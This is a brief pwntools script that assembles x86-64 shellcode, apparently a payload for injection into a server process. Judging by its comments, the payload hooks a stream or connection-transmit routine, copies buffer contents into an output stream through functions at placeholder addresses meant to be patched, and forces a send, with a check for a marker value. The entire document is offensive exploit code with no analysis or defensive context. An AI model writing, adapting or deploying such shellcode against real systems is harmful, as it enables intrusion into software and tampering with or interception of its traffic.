from pwn import *

context.arch = 'amd64'

"""
r12 stream->p
r13 stream->p - stream->end
r14 g_con_trans
r15 g_con_trans->out_s
"""
shellcode = """
push rbp
mov rbp, rsp
mov r12, [rdi]       
mov r13, [rdi + 0x8]
sub r13, r12          
movabs r14, 0xdeadbeefdddddddd
mov r14, [r14] 
mov rdi, r14 
movabs rax, 0xdeadbeefaaaaaaaa
mov rsi, r13
call rax
mov r15, rax
mov rdi, [r15]
mov rsi, r12
mov rdx, r13
movabs rax, 0xdeadbeefcccccccc
call rax
add [r15], r13
add [r15 + 0x8], r13
cmp DWORD PTR [r12], 0xcafebabe
jne send_payload
sub QWORD PTR [r15 + 0x10], 0x8000
send_payload:   
mov rdi, r14
movabs rax, 0xdeadbeefcccccccc
call rax
leave
ret

       
leave    
ret
"""
shellcode = asm(shellcode)
print(shellcode)